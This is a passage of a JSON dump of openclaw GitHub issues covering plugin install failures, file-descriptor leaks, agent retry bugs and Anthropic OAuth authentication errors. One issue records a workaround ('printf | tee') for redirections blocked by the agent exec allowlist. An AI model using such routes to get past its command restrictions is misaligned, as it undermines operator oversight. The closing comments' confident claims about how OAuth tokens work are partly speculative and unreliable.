      "body": "## Bug\n\n`clawdbot onboard` fails when selecting Matrix channel, leaving incomplete installation that causes duplicate plugin warnings and missing dependencies.\n\n## Steps to Reproduce\n\n1. Run `clawdbot onboard`\n2. Select Matrix as a channel\n3. Complete wizard\n4. Check `clawdbot status`\n\n## Expected\n\nMatrix plugin installs and loads successfully without warnings.\n\n## Actual\n\n```\nPlugin install failed: npm install failed\nConfig warnings: duplicate plugin id detected\n[plugins] matrix failed to load: Error: Cannot find module 'matrix-bot-sdk'\n```\n\n## Root Cause\n\n`extensions/matrix/package.json` contains pnpm workspace syntax that npm can't parse:\n\n```json\n\"devDependencies\": {\n  \"clawdbot\": \"workspace:*\"\n}\n```\n\nWhen wizard runs `npm install`, it fails with `EUNSUPPORTEDPROTOCOL`, leaving an incomplete installation at `~/.clawdbot/extensions/matrix/` while the bundled version already exists.\n\n## Impact\n\nAffects all users installing Matrix plugin via wizard. Plugin fails to load despite \"successful\" installation.\n\n## Suggested Fix\n\nRemove `devDependencies` with workspace syntax from `extensions/matrix/package.json`:\n\n```diff\n- \"devDependencies\": {\n-   \"clawdbot\": \"workspace:*\"\n- }\n```\n\n## Environment\n\n- clawdbot: 2026.1.24-2\n- Node.js: 22.22.0\n- npm: (any version - affects all)",
      "state": "closed",
      "comments": 8,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/1839",
      "createdAt": "2026-01-25T15:56:28Z",
      "updatedAt": "2026-02-11T00:17:03Z",
      "author": "shivanshPurple",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "onboarding",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3796870473,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1839#issuecomment-3796870473",
          "createdAt": "2026-01-25T16:02:23Z",
          "updatedAt": "2026-01-25T16:02:43Z",
          "author": "shivanshPurple",
          "body": "Filing this issue because I experienced it on 3 different machines - both cloud servers and my Raspberry Pi."
        },
        {
          "id": 3797083774,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1839#issuecomment-3797083774",
          "createdAt": "2026-01-25T18:52:38Z",
          "updatedAt": "2026-01-25T18:52:38Z",
          "author": "shrimpwtf",
          "body": "get the same"
        },
        {
          "id": 3817645307,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1839#issuecomment-3817645307",
          "createdAt": "2026-01-29T13:17:22Z",
          "updatedAt": "2026-01-29T13:17:22Z",
          "author": "sebslight",
          "body": "Closing this issue due to inactivity (no updates in 3+ days). If this is still relevant, please feel free to reopen with any additional context or updates.\n\nThanks for taking the time to report this!"
        },
        {
          "id": 3825198534,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1839#issuecomment-3825198534",
          "createdAt": "2026-01-30T19:00:06Z",
          "updatedAt": "2026-01-30T19:00:06Z",
          "author": "CaseyLabs",
          "body": "Please re-open this issue, just encountered it myself, thanks!"
        },
        {
          "id": 3825754875,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1839#issuecomment-3825754875",
          "createdAt": "2026-01-30T21:10:52Z",
          "updatedAt": "2026-01-30T21:10:52Z",
          "author": "0x7466",
          "body": "Same issue here"
        },
        {
          "id": 3829315549,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1839#issuecomment-3829315549",
          "createdAt": "2026-01-31T20:55:06Z",
          "updatedAt": "2026-01-31T20:55:06Z",
          "author": "joshuafhiggins",
          "body": "This is still an issue, please re-open. Possibly related to #5292 "
        },
        {
          "id": 3881382449,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1839#issuecomment-3881382449",
          "createdAt": "2026-02-11T00:08:07Z",
          "updatedAt": "2026-02-11T00:08:07Z",
          "author": "bardicreels",
          "body": "Same issue, tried suggested fix, did not work\n"
        },
        {
          "id": 3881420686,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1839#issuecomment-3881420686",
          "createdAt": "2026-02-11T00:17:03Z",
          "updatedAt": "2026-02-11T00:17:03Z",
          "author": "bardicreels",
          "body": "straight up just removed /usr/local/lib/node_modules/openclaw/extensions/matrix/  \n\nentirely and restarted gateway, no error anymore\n\nno confirmation if the remaining matrix plugin works\n\nsuggests error is introduced at install via a npm pnpm conflict as suggested in https://github.com/openclaw/openclaw/issues/5292#issuecomment-3827977416 \n\n "
        }
      ]
    },
    {
      "number": 13750,
      "title": "exec allowlist: heredocs should not be treated as blocked redirections",
      "body": "When exec.security=allowlist, heredocs are rejected by the same logic that blocks output redirections. Heredocs are stdin input, not output redirections - they should be allowed when the target binary is in safeBins. Functionally identical to piping (which works). Workaround: printf | tee. OpenClaw 2026.2.9, macOS arm64.",
      "state": "closed",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13750",
      "createdAt": "2026-02-11T00:16:11Z",
      "updatedAt": "2026-02-11T00:16:51Z",
      "author": "brin-tapcart",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": []
      },
      "commentsData": [
        {
          "id": 3881419556,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13750#issuecomment-3881419556",
          "createdAt": "2026-02-11T00:16:51Z",
          "updatedAt": "2026-02-11T00:16:51Z",
          "author": "brin-tapcart",
          "body": "Duplicate of #13749 — closing this one."
        }
      ]
    },
    {
      "number": 13751,
      "title": "Feishu plugin: remove dependency on contact:contact.base:readonly for sender name resolution",
      "body": "## Problem\n\nThe Feishu plugin currently requires `contact:contact.base:readonly` permission to resolve sender display names. This is a highly sensitive permission that grants read access to the entire organization's contact directory — far too broad for the simple need of knowing \"who sent this message\".\n\n## Where it's used\n\n1. **`bot.ts` — `resolveFeishuSenderName()`** (line ~105): Calls `client.contact.user.get()` on every incoming message to resolve the sender's `open_id` to a display name. This is the primary trigger for the permission error.\n\n2. **`directory.ts` — `listFeishuDirectoryPeersLive()`**: Calls `client.contact.user.list()` to enumerate users. This is a secondary usage.\n\n## Proposed Solution\n\n### For sender name resolution (`bot.ts`):\n- Feishu's event webhook payload (`im.message.receive_v1`) already includes sender information. The `sender_id` fields are already being extracted — the display name could potentially be included in the event subscription configuration.\n- Alternatively, use the `event.sender.sender_type` and message context to infer names without calling the contact API.\n- As a fallback, gracefully degrade to using `open_id` as the display name (which already happens on permission error, but without the error noise).\n\n### For directory listing (`directory.ts`):\n- `listFeishuDirectoryPeersLive()` already has a fallback to `listFeishuDirectoryPeers()` (which reads from config). The live version could be gated behind an explicit opt-in config flag rather than being attempted by default.\n\n## Impact\n\nWithout this permission:\n- Every message triggers a permission error (code 99991672)\n- The error is caught and handled gracefully, but it generates noise in logs and triggers a permission grant notification to the user\n- The 5-minute cooldown on notifications helps, but the underlying API call is still made on every message (after cache TTL expires)\n\n## User Feedback\n\nA user reported that this permission is too sensitive for their organization's security policy and should not be required for basic bot functionality. The bot should work fully without organization-wide contact directory access.\n\n## Environment\n- OpenClaw version: 2026.2.9\n- Feishu plugin: `extensions/feishu/`",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13751",
      "createdAt": "2026-02-11T00:16:45Z",
      "updatedAt": "2026-02-11T00:16:45Z",
      "author": "echoVic",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "config"
        ]
      }
    },
    {
      "number": 13748,
      "title": "bug: pi-agent-core _resolveRetry() fires before tool execution completes (upstream)",
      "body": "## Upstream Bug in @mariozechner/pi-agent-core\n\nThis is the root cause of the \"missing tool result\" bug (#8643, #13351). Filing here because `badlogic/pi-mono` has issues disabled.\n\n### Problem\n\nIn `@mariozechner/pi-coding-agent`'s `agent-session.js`, `_resolveRetry()` fires on the `message_end` event handler — **before tool execution completes** in the retried agent loop.\n\n```js\n// Current code (fires too early):\nif (assistantMsg.stopReason !== \"error\" && this._retryAttempt > 0) {\n    this._emit({ type: \"auto_retry_end\", success: true, attempt: this._retryAttempt });\n    this._retryAttempt = 0;\n    this._resolveRetry();  // resolves BEFORE tools execute\n}\n```\n\nWhen the retry's assistant response includes tool calls (`stopReason: \"toolUse\"`), `waitForRetry()` resolves while tools are still pending. This causes OpenClaw's attempt `finally` block to flush pending tool results as synthetic errors before tools ever run.\n\n### Suggested Upstream Fix\n\nMove `_resolveRetry()` to the `agent_end` handler so it resolves after the full loop completes:\n\n```js\nif (event.type === \"agent_end\" && this._retryAttempt > 0) {\n    this._emit({ type: \"auto_retry_end\", success: true, attempt: this._retryAttempt });\n    this._retryAttempt = 0;\n    this._resolveRetry();\n}\n```\n\n### Current Workaround\n\n#13746 adds `agent.waitForIdle()` before the flush to ensure the retry loop fully completes. This works but is a workaround — the proper fix belongs upstream.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13748",
      "createdAt": "2026-02-11T00:15:29Z",
      "updatedAt": "2026-02-11T00:15:29Z",
      "author": "rodbland2021",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": []
      }
    },
    {
      "number": 11721,
      "title": "memory_search causes spawn EBADF — native embedding provider leaks file descriptors",
      "body": "## Bug Description\n\n`memory_search` calls via the native (builtin) embedding provider corrupt the gateway process file descriptors, causing all subsequent `child_process.spawn()` calls to fail with `spawn EBADF`. This makes `exec`, `process`, and any tool that spawns child processes completely non-functional until a hard gateway restart.\n\n## Environment\n\n- **OpenClaw version:** 2026.2.6-3\n- **OS:** macOS (Darwin 24.6.0, x64)\n- **Node.js:** v22.22.0\n- **Hardware:** Intel i7-7700 (4c/8t), 16GB RAM\n\n## Steps to Reproduce\n\n1. Configure native memory search with any remote embedding provider:\n   ```json\n   \"memorySearch\": {\n     \"enabled\": true,\n     \"provider\": \"openai\",\n     \"model\": \"text-embedding-3-small\",\n     \"remote\": {\n       \"baseUrl\": \"https://api.openai.com/v1/\",\n       \"apiKey\": \"sk-...\"\n     }\n   }\n   ```\n2. Start gateway, wait for initialization\n3. Monitor file descriptors: `lsof -p <gateway-pid> | wc -l` → shows ~72\n4. Trigger a `memory_search` call (via agent tool)\n5. Search results ARE returned successfully\n6. Check fd count again → `lsof -p <gateway-pid> | wc -l` → returns 0 or errors\n7. Any subsequent `exec` tool call → `spawn EBADF`\n\n## Expected Behavior\n\n`memory_search` should complete without corrupting the process file descriptor table. Subsequent tool calls should continue to work normally.\n\n## Actual Behavior\n\n- Search results are returned correctly (the embedding API call itself succeeds)\n- But the process fd table is corrupted immediately after\n- ALL subsequent `child_process.spawn()` calls fail with `spawn EBADF`\n- Only fix is a hard gateway restart (`kill <pid>` or `pkill openclaw-gateway`)\n- SIGUSR1 restart does NOT fix it (same process, same corrupted fds)\n\n## Additional Findings\n\n1. **Not provider-specific:** Tested with OpenAI-compatible (custom endpoint) AND Gemini (`gemini-embedding-001`) — both cause identical EBADF\n2. **Affects QMD fallback too:** When `memory.backend: \"qmd\"` is set but QMD search fails/times out, the gateway falls back to the native embedding provider, which also causes EBADF\n3. **Auto-detection is aggressive:** Even with `memory.backend: \"qmd\"` and no explicit `memorySearch.provider`, the native provider auto-activates when `OPENAI_API_KEY` is in the environment\n4. **`memorySearch.fallback: \"none\"` does not prevent it:** The native provider still activates despite this setting\n5. **`memorySearch.enabled: false` is the only workaround** that reliably prevents the bug\n6. **Single call is sufficient:** One `memory_search` call immediately corrupts the process — no accumulation needed\n\n## Workaround\n\n```json\n\"memorySearch\": { \"enabled\": false }\n```\n\nThis completely prevents the embedding code path from executing. Search files manually via `exec` + `grep`.\n\n## Severity\n\n**Critical** — silently corrupts the gateway process, making all exec-based tools non-functional with no auto-recovery. Requires manual human intervention (hard kill) to restore.\n\n## Labels\n\nbug, memory, critical",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/11721",
      "createdAt": "2026-02-08T07:00:30Z",
      "updatedAt": "2026-02-11T00:13:55Z",
      "author": "rex05ai",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos",
          "linux"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3866360838,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11721#issuecomment-3866360838",
          "createdAt": "2026-02-08T07:12:14Z",
          "updatedAt": "2026-02-08T07:12:14Z",
          "author": "r3n3x",
          "body": "+1, i am encountering this issue \n, too (V 2026.2.6-3)"
        },
        {
          "id": 3881404882,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11721#issuecomment-3881404882",
          "createdAt": "2026-02-11T00:13:55Z",
          "updatedAt": "2026-02-11T00:13:55Z",
          "author": "rex05ai",
          "body": "## Related Issues and Patterns\n\nAfter searching the issue tracker, this appears to be part of a broader **file descriptor leak epidemic** affecting OpenClaw on macOS. Here are the related reports:\n\n### Direct File Descriptor Leak Issues\n\n**Memory/Embedding Subsystem:**\n- #5138 - MemoryIndexManager INDEX_CACHE leaks FDs, watchers, and timers (P1/High, CWE-404)\n- #5968 - Memory subsystem FD leak: git objects not closed after embedding\n- #9068 - FD leak in bash-tools.exec.js - child process stdio streams not closed on session exit\n- #11181 - File descriptor leak in workspace scanning on every message\n\n**Skill Scanner / File Watcher:**\n- #2532 - `spawn EBADF` error on all exec tool calls (15 comments, PR #8869 pending)\n- #3708 - FD leak: gateway skill scanner opens .venv files and never closes them (7 comments)\n- #5827 - chokidar file watcher lacks ignore patterns, causing FD exhaustion and spawn EBADF\n- #9481 - FD Leak: skills watcher ignores .venv/, causing spawn EBADF\n- #9960 - macOS: gateway exec starts failing after skill directory scan leaks ~12k open FDs (Python venv)\n\n**Exec Tool / spawn EBADF:**\n- #8841 - exec tool fails with \"spawn EBADF\" error - persists across restart and reboot\n- #8938 - exec tool fails with \"spawn EBADF\" error on macOS\n- #9921 - Critical: File descriptor leak causes exec tool to fail (EBADF)\n- #11243 - Gradual FD leak under macOS LaunchAgent causes EMFILE after extended uptime (256 FD soft limit)\n- #11589 - macOS Tahoe 26.2: exec always fails (pipe path spawn EBADF errno=-9; PTY path exits 1 with no output)\n- #12181 - persistent spawn EBADF error on exec tool calls (Node v22.22.0 + macOS)\n\n### memory_search Tool Issues (may overlap with root cause)\n\n- #9645 - memory_search never calls qmd search when using QMD backend (7 comments)\n- #9000 - memory_search returns empty when memory.backend=qmd, but qmd CLI works (5 comments)\n- #8560 - memory_search tool fails - dist/memory/manager.js missing (3 comments)\n- #10393 - memory_search: support local file search without external API\n- #10734 - memory_search returns empty results despite functional database and embeddings\n- #10931 - memory_search tool fails with Ollama embeddings (fetch failed), CLI works\n- #11727 - memory_search returns empty results despite indexed chunks\n- #11981 - memory_search tool doesn't use qmd backend when memory.backend=qmd\n- #12021 - memory_search tool ignores memory.backend: 'qmd' config, tries cloud providers\n\n### Pattern Analysis\n\nThe common thread appears to be:\n1. **Memory indexing/embedding operations** open file handles (git objects, workspace files, etc.)\n2. **File handles are never closed** due to missing cleanup in async paths\n3. **FD count accumulates** until system limit (~10,240 on macOS)\n4. **All spawn() calls fail with EBADF** once limit is reached\n5. **Hard restart temporarily fixes** the symptom but doesn't address the leak\n\n### Potential Root Causes\n\nBased on the related issues:\n- **MemoryIndexManager INDEX_CACHE** not releasing resources (#5138)\n- **Git object files** left open after embedding (#5968)\n- **Python venv files** in skills directories scanned but never closed (#2532, #3708, #9481)\n- **chokidar file watcher** lacking ignore patterns (#5827)\n- **Workspace file scanning** on every message (#11181)\n\n### Suggested Next Steps\n\n1. Check if PR #8869 (fix for #2532) addresses this case\n2. Investigate if disabling memory indexing prevents the leak (confirms root cause)\n3. Monitor FD count with `lsof -p <gateway-pid> | wc -l` to identify leak rate\n4. Consider adding FD leak detection to OpenClaw health checks\n\ncc @tyler6204 @jverkoey (PR #8869 author)"
        }
      ]
    },
    {
      "number": 9095,
      "title": "[Bug] Anthropic OAuth authentication fails with HTTP 401 invalid bearer token",
      "body": "## Description\n\nClaude models fail to authenticate when using OAuth bearer tokens, resulting in HTTP 401 errors and causing all Anthropic models to enter cooldown, leading to complete fallback chain failure.\n\n## Problem\n\nAfter configuring Anthropic authentication using OAuth tokens (via `setup-token` flow), attempts to use Claude models consistently fail with authentication errors. Once a token failure occurs, the entire provider enters cooldown mode, preventing any subsequent requests until manual intervention.\n\n## Error Message\n\n```\nHTTP 401 authentication_error: Invalid bearer token\n```\n\nFollowed by:\n\n```\nNo available auth profile for anthropic (all in cooldown or unavailable)\n```\n\n## Impact\n\n- **Critical**: All Anthropic/Claude models become completely unavailable\n- Complete fallback chain failure when Anthropic is the primary or only provider\n- No automatic recovery - requires manual intervention\n- Poor user experience with no clear resolution path\n- Affects all Claude model variants (Opus, Sonnet, Haiku)\n\n## Environment\n\n- **OpenClaw Version**: 2026.2.2-3\n- **Platform**: macOS\n- **Authentication Method**: OAuth bearer token (setup-token flow)\n- **Affected Models**: All Anthropic Claude models\n\n## Reproduction Steps\n\n1. Configure Anthropic provider using OAuth token:\n   ```bash\n   openclaw providers setup anthropic --auth-method setup-token\n   ```\n\n2. Paste OAuth bearer token when prompted\n\n3. Attempt to use any Claude model through OpenClaw:\n   ```bash\n   openclaw chat \"Hello\" --model claude-opus-4-5\n   ```\n\n4. Observe HTTP 401 authentication error\n\n5. Attempt subsequent requests\n\n6. Observe \"all in cooldown\" error preventing any Anthropic model usage\n\n## Expected Behavior\n\n1. **Valid token**: OAuth token should authenticate successfully\n2. **Token refresh**: If token expires, OpenClaw should automatically refresh it\n3. **Clear errors**: If token is invalid, provide clear actionable error message\n4. **Graceful degradation**: Single auth failure shouldn't put entire provider in permanent cooldown\n5. **Recovery**: Automatic retry with token refresh, or clear instructions for manual token update\n\n## Actual Behavior\n\n1. OAuth token immediately fails with 401 error\n2. No automatic token refresh attempted\n3. All Anthropic auth profiles enter cooldown\n4. Provider becomes completely unavailable\n5. No automatic recovery mechanism\n6. No clear guidance on resolution\n\n## Error Pattern Timeline\n\n```\n[Initial Request]\n-> HTTP 401: Invalid bearer token\n\n[Subsequent Requests]\n-> No available auth profile for anthropic (all in cooldown or unavailable)\n\n[Continues indefinitely until manual intervention]\n```\n\n## Additional Context\n\n- This may be related to OAuth token format or expiration handling\n- Token might be valid but malformed in request headers\n- Refresh token mechanism may not be implemented\n- Cooldown period may be too aggressive for auth failures\n- No distinction between temporary auth failures and permanent token invalidity\n\n## Suggested Fix\n\n1. **Token validation**: Validate OAuth token format before use\n2. **Refresh mechanism**: Implement automatic OAuth token refresh using refresh tokens\n3. **Retry logic**: Distinguish between expired tokens (retry with refresh) vs invalid tokens (prompt user)\n4. **Cooldown adjustment**: Don't apply cooldown for auth errors that can be resolved\n5. **Error messages**: Provide specific guidance:\n   - \"OAuth token expired. Attempting refresh...\"\n   - \"OAuth token invalid. Please reconfigure: openclaw providers setup anthropic\"\n6. **Health check**: Add endpoint to validate token status before actual API calls\n7. **Logging**: Add debug logs showing token validation and refresh attempts\n\n## Workaround\n\nCurrently, users must:\n1. Stop the OpenClaw gateway\n2. Reconfigure Anthropic provider with new token\n3. Restart gateway\n4. Hope the new token works\n\nThis is not sustainable for production use.\n\n## Labels\n\n`bug`, `authentication`, `anthropic`, `oauth`, `priority:critical`",
      "state": "open",
      "comments": 15,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/9095",
      "createdAt": "2026-02-04T21:31:38Z",
      "updatedAt": "2026-02-11T00:12:22Z",
      "author": "nikolasdehor",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3849863632,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/9095#issuecomment-3849863632",
          "createdAt": "2026-02-04T21:36:06Z",
          "updatedAt": "2026-02-04T21:36:06Z",
          "author": "nikolasdehor",
          "body": "## Additional Technical Details\n\nFound the root cause by examining auth-profiles.json:\n\n### Current Configuration (Incorrect)\n```json\n\"anthropic:default\": {\n  \"type\": \"token\",              // ❌ Wrong type\n  \"provider\": \"anthropic\",\n  \"token\": \"sk-ant-oat01-...\"    // This is an OAuth App Token\n}\n```\n\n### Issue Analysis\n1. **Token Format**: `sk-ant-oat01-*` indicates this is an **OAuth App Token** (should use Claude subscription)\n2. **Type Mismatch**: Configured as `type: \"token\"` but should be `type: \"oauth\"`\n3. **API Key Format**: Regular API keys use `sk-ant-api03-*` format\n4. **OAuth Token Format**: OAuth tokens use `sk-ant-oat01-*` format\n\n### Current State\n- **Error Count**: 7 authentication failures\n- **Cooldown**: Token in cooldown due to repeated failures\n- **Last Failure**: HTTP 401 Invalid bearer token\n\n### Expected Behavior\nWhen configured via `openclaw configure` with OAuth flow:\n1. Token type should be automatically set to `\"oauth\"`\n2. OAuth tokens should be handled differently from API keys\n3. Token refresh should work automatically for OAuth tokens\n\n### Actual Behavior\n1. OAuth token saved with `type: \"token\"`\n2. System treats it as regular API key\n3. Fails with HTTP 401 because auth header format is wrong for OAuth tokens\n4. Enters permanent cooldown until manual intervention\n\n### Suggested Fix\n1. Detect token format (`sk-ant-oat01-*` vs `sk-ant-api03-*`)\n2. Automatically set correct type based on token prefix\n3. Handle OAuth token authentication differently (different endpoint/headers)\n4. Implement proper token refresh for OAuth tokens\n\n### Files Involved\n- `~/.openclaw/agents/main/agent/auth-profiles.json` (token storage)\n- `~/.openclaw/openclaw.json` (profile configuration)\n\ncc: This explains why the OAuth flow appears broken - it's saving OAuth tokens with the wrong type configuration."
        },
        {
          "id": 3850789663,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/9095#issuecomment-3850789663",
          "createdAt": "2026-02-05T02:55:49Z",
          "updatedAt": "2026-02-05T02:55:49Z",
          "author": "marc-niclas",
          "body": "> ### Current Configuration (Incorrect)\n> \"anthropic:default\": {\n>   \"type\": \"token\",              // ❌ Wrong type\n>   \"provider\": \"anthropic\",\n>   \"token\": \"sk-ant-oat01-...\"    // This is an OAuth App Token\n> }\n> ### Issue Analysis\n> 1. **Token Format**: `sk-ant-oat01-*` indicates this is an **OAuth App Token** (should use Claude subscription)\n> 2. **Type Mismatch**: Configured as `type: \"token\"` but should be `type: \"oauth\"`\n\nmhm but when I change `type` to `oauth`, I get:\n```\n⚠️ Agent failed before reply: All models failed (2): anthropic/claude-opus-4-5: No API key found for provider \"anthropic\". Auth \nstore: /home/mnh/.openclaw/agents/main/agent/auth-profiles.json (agentDir: /home/mnh/.openclaw/agents/main/agent). \nConfigure auth for this agent (openclaw agents add <id>) or copy auth-profiles.json from the main agentDir. (auth) | ...\n```\n\n```json\n// .openclaw/openclaw.json\n\"auth\": {\n  \"profiles\": {\n     \"anthropic:default\": {\n       \"provider\": \"anthropic\",\n       \"mode\": \"oauth\" // I changed this, not sure if correct\n     }\n  }\n}\n```\n\n```json\n// .openclaw/agents/main/agent/auth-profiles.json\n\"profiles\": {\n  \"anthropic:default\": {\n    \"type\": \"oauth\",\n    \"provider\": \"anthropic\",\n    \"token\": \"sk-ant-oat01-...\"\n  }\n}\n```"
        },
        {
          "id": 3850812966,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/9095#issuecomment-3850812966",
          "createdAt": "2026-02-05T03:04:37Z",
          "updatedAt": "2026-02-05T03:04:37Z",
          "author": "nikolasdehor",
          "body": "## Root Cause Confirmed\n\n@marc-niclas Thanks for testing! This confirms the issue is deeper than just the type field.\n\n### The Problem\n\nAnthropic OAuth tokens (`sk-ant-oat01-*`) are **fundamentally different** from OpenAI OAuth tokens:\n\n**OpenAI OAuth (working):**\n```json\n{\n  \"type\": \"oauth\",\n  \"provider\": \"openai-codex\",\n  \"access\": \"eyJhbGciOiJ...\",      // JWT access token\n  \"refresh\": \"rt_vASC6p4WWAzt...\",  // Refresh token\n  \"expires\": 1770931329164           // Expiry timestamp\n}\n```\n\n**Anthropic OAuth (current):**\n```json\n{\n  \"type\": \"token\",  // or \"oauth\"\n  \"provider\": \"anthropic\",\n  \"token\": \"sk-ant-oat01-...\"  // Just a single token string\n}\n```\n\n### Why Changing to `type: \"oauth\"` Fails\n\nOpenClaw's OAuth handler expects the **OpenAI format** (access + refresh + expires). When you set `type: \"oauth\"` for Anthropic, it looks for `access` and `refresh` fields which don't exist.\n\n### The Real Issue\n\nAnthropic's OAuth implementation is **different from the standard OpenClaw OAuth flow**:\n\n1. **Token Format**: Anthropic uses session-based tokens (`sk-ant-oat01-*`) not JWT\n2. **No Refresh**: Anthropic OAuth tokens don't have separate refresh tokens\n3. **Authentication Method**: Likely uses different headers/endpoints\n4. **Expiry**: No explicit expiry field (may be session-based)\n\n### Solution\n\nOpenClaw needs **provider-specific OAuth handling**:\n\n```typescript\n// Pseudocode for fix\nif (provider === 'anthropic' && type === 'oauth') {\n  // Use Anthropic-specific OAuth flow\n  headers['Authorization'] = `Bearer ${token}`;  // Different from API key\n  // Handle session-based auth\n  // No refresh token logic\n} else if (provider === 'openai-codex' && type === 'oauth') {\n  // Use standard OAuth flow with access/refresh tokens\n}\n```\n\n### Workaround\n\nUntil this is fixed, use a regular **API key** instead of OAuth token:\n\n1. Get API key from: https://console.anthropic.com/settings/keys\n2. Format: `sk-ant-api03-...` (not `sk-ant-oat01-...`)\n3. Configure as `type: \"token\"`\n\nThis will use Claude API credits instead of your Claude Pro/Max subscription, but it works reliably.\n\n### Files to Fix\n\n- `src/auth/providers/anthropic.ts` (or similar)\n- OAuth token detection logic\n- Authentication header construction\n- Token validation/refresh logic\n\nThe fix requires understanding Anthropic's OAuth implementation which may be undocumented for third-party use."
        },
        {
          "id": 3850828921,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/9095#issuecomment-3850828921",
          "createdAt": "2026-02-05T03:11:18Z",
          "updatedAt": "2026-02-05T03:11:18Z",
          "author": "nikolasdehor",
          "body": "## Implementation Guide: Anthropic OAuth Support\n\nThis would allow users to use their **Claude Pro/Max subscription** instead of paying for API credits.\n\n---\n\n## 1. Current OAuth Token Analysis\n\n### Token Format Comparison\n\n**Anthropic OAuth Token:**\n```\nsk-ant-oat01-XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n```\n- Prefix: `sk-ant-oat01-`\n- Length: ~100 characters\n- Type: Session-based bearer token\n- Source: https://claude.ai → Account Settings → Developer → Create Token\n\n**Anthropic API Key:**\n```\nsk-ant-api03-XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n```\n- Prefix: `sk-ant-api03-`\n- Source: https://console.anthropic.com/settings/keys\n- Billing: Charges API credits\n\n---\n\n## 2. Authentication Differences\n\n| Feature | OpenAI OAuth | Anthropic OAuth |\n|---------|--------------|-----------------|\n| Token Structure | JWT (access + refresh) | Single session token |\n| Refresh Mechanism | Explicit refresh endpoint | Session-based (no refresh) |\n| Expiry | Explicit timestamp | Implicit (session timeout) |\n| Header Format | `Authorization: Bearer <access>` | `Authorization: Bearer <token>` |\n| Base URL | api.openai.com | api.anthropic.com |\n| Account Type | ChatGPT Plus/Pro | Claude Pro/Max |\n\n---\n\n## 3. Required Implementation\n\n### A. Token Type Detection\n\n```typescript\nfunction detectAnthropicTokenType(token: string): 'oauth' | 'api-key' {\n  if (token.startsWith('sk-ant-oat01-')) {\n    return 'oauth';  // Claude subscription\n  }\n  if (token.startsWith('sk-ant-api03-')) {\n    return 'api-key';  // API credits\n  }\n  throw new Error('Unknown Anthropic token format');\n}\n```\n\n### B. Authentication Handler\n\n```typescript\nclass AnthropicOAuthProvider {\n  async authenticate(token: string) {\n    // Anthropic OAuth uses simple bearer token\n    return {\n      headers: {\n        'Authorization': `Bearer ${token}`,\n        'anthropic-version': '2023-06-01',\n        'content-type': 'application/json',\n      }\n    };\n  }\n\n  async validateToken(token: string): Promise<boolean> {\n    try {\n      // Test token with a minimal API call\n      const response = await fetch('https://api.anthropic.com/v1/messages', {\n        method: 'POST',\n        headers: {\n          'Authorization': `Bearer ${token}`,\n          'anthropic-version': '2023-06-01',\n          'content-type': 'application/json',\n        },\n        body: JSON.stringify({\n          model: 'claude-3-5-sonnet-20241022',\n          max_tokens: 1,\n          messages: [{ role: 'user', content: 'test' }]\n        })\n      });\n      \n      return response.ok;\n    } catch {\n      return false;\n    }\n  }\n\n  // No refresh mechanism - session tokens are long-lived\n  async refreshToken(token: string): Promise<string> {\n    // Anthropic OAuth tokens don't refresh\n    // They remain valid until manually revoked\n    return token;\n  }\n}\n```\n\n### C. Configuration Auto-Detection\n\nWhen saving auth profile, auto-detect and configure:\n\n```typescript\nfunction saveAnthropicAuth(token: string) {\n  const tokenType = detectAnthropicTokenType(token);\n  \n  return {\n    type: tokenType,\n    provider: 'anthropic',\n    token: token,\n    // No access/refresh/expires for OAuth tokens\n    ...(tokenType === 'oauth' && {\n      accountType: 'subscription',  // Claude Pro/Max\n      billingMode: 'subscription'   // vs 'api-credits'\n    })\n  };\n}\n```\n\n---\n\n## 4. API Endpoint Differences\n\n### Messages API (Both OAuth and API Key)\n\n```bash\nPOST https://api.anthropic.com/v1/messages\nAuthorization: Bearer sk-ant-oat01-...  # OAuth token\nAuthorization: Bearer sk-ant-api03-...  # API key\n\n# Same endpoint, different billing!\n```\n\n**Key Insight:** The API endpoint is **identical** for both token types. The difference is:\n- OAuth tokens (`oat01`) → Billed to Claude subscription\n- API keys (`api03`) → Billed to API credits\n\n---\n\n## 5. Session Management\n\n### OAuth Token Lifecycle\n\n```typescript\ninterface AnthropicOAuthSession {\n  token: string;              // sk-ant-oat01-...\n  createdAt: number;          // Timestamp when saved\n  lastValidated: number;      // Last successful API call\n  accountType: 'pro' | 'max'; // Claude subscription 